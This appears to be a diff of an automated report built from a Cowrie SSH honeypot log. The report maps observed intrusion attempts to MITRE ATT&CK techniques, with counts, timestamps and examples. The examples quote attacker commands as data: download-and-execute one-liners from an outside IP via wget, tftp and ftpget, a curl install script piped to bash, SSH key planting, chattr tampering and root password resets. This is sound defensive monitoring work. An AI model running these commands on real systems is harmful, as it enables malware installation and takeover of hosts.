@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-22 04:00:42",
+  "generated": "2026-09-22 05:01:42",
   "totals": {
-    "commands": 165,
-    "login_failed": 436,
-    "login_success": 25,
-    "sessions": 501
+    "commands": 212,
+    "login_failed": 1240,
+    "login_success": 35,
+    "sessions": 1357
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 436,
+      "count": 1240,
       "examples": [
         "daoperator / daoperator",
         "root / User@2022",
@@ -21,30 +21,14 @@
         "root / root"
       ],
       "first": "2026-09-22T00:01:24.262742Z",
-      "last": "2026-09-22T04:00:42.674582Z",
-      "unique_ips": 19
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 38,
-      "examples": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-        ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
-      ],
-      "first": "2026-09-22T00:06:11.162241Z",
-      "last": "2026-09-22T03:44:11.543409Z",
-      "unique_ips": 7
+      "last": "2026-09-22T05:01:41.264130Z",
+      "unique_ips": 28
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 30,
+      "count": 49,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -53,14 +37,30 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-22T00:06:56.657809Z",
-      "last": "2026-09-22T03:10:19.164589Z",
-      "unique_ips": 5
+      "last": "2026-09-22T04:48:51.377546Z",
+      "unique_ips": 8
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 42,
+      "examples": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
+      ],
+      "first": "2026-09-22T00:06:11.162241Z",
+      "last": "2026-09-22T04:48:33.453473Z",
+      "unique_ips": 9
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 25,
+      "count": 35,
       "examples": [
         "salam / salam",
         "experiment / experiment",
@@ -69,28 +69,30 @@
         "root / password"
       ],
       "first": "2026-09-22T00:06:10.185022Z",
-      "last": "2026-09-22T03:43:16.373836Z",
-      "unique_ips": 14
+      "last": "2026-09-22T04:59:41.049670Z",
+      "unique_ips": 22
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 10,
+      "count": 14,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-09-22T00:06:49.812853Z",
-      "last": "2026-09-22T03:44:11.543409Z",
-      "unique_ips": 5
+      "last": "2026-09-22T04:59:58.846325Z",
+      "unique_ips": 8
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 9,
+      "count": 13,
       "examples": [
         "w",
         "whoami",
@@ -98,45 +100,45 @@
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-22T00:07:06.574871Z",
-      "last": "2026-09-22T03:43:20.342345Z",
-      "unique_ips": 6
+      "last": "2026-09-22T04:48:49.679745Z",
+      "unique_ips": 8
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 10,
       "examples": [
         "crontab -l",
         "top"
       ],
       "first": "2026-09-22T00:07:05.175470Z",
-      "last": "2026-09-22T03:10:17.254580Z",
-      "unique_ips": 3
+      "last": "2026-09-22T04:48:47.087986Z",
+      "unique_ips": 5
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 5,
       "examples": [
         "ls -lh $(which ls)"
       ],
       "first": "2026-09-22T00:07:03.797814Z",
-      "last": "2026-09-22T03:10:15.312150Z",
-      "unique_ips": 3
+      "last": "2026-09-22T04:48:42.667030Z",
+      "unique_ips": 5
     },
     {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 3,
+      "count": 5,
       "examples": [
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
       ],
       "first": "2026-09-22T00:06:49.446552Z",
-      "last": "2026-09-22T03:10:08.101619Z",
-      "unique_ips": 3
+      "last": "2026-09-22T04:48:33.453473Z",
+      "unique_ips": 5
     },
     {
       "id": "T1070.004",
@@ -183,19 +185,19 @@
     ],
     [
       "system",
-      14
+      15
     ],
     [
       "shell",
-      14
+      15
     ],
     [
       "sh",
-      13
+      14
     ],
     [
       "/bin/busybox UNSTABLE",
-      11
+      12
     ],
     [
       "enable",
@@ -235,6 +237,26 @@
     ],
     [
       "echo \"root:gtcm5BNXAboX\"|chpasswd|bash",
+      1
+    ],
+    [
+      "Accept-Encoding: gzip",
+      1
+    ],
+    [
+      "echo -e \"adi\\nXjYtVRRUchsz\\nXjYtVRRUchsz\"|passwd|bash",
+      1
+    ],
+    [
+      "echo \"adi\\nXjYtVRRUchsz\\nXjYtVRRUchsz\\n\"|passwd",
+      1
+    ],
+    [
+      "echo -e \"qwe123\\niybDQbh1TWu0\\niybDQbh1TWu0\"|passwd|bash",
+      1
+    ],
+    [
+      "echo \"qwe123\\niybDQbh1TWu0\\niybDQbh1TWu0\\n\"|passwd",
       1
     ]
   ]
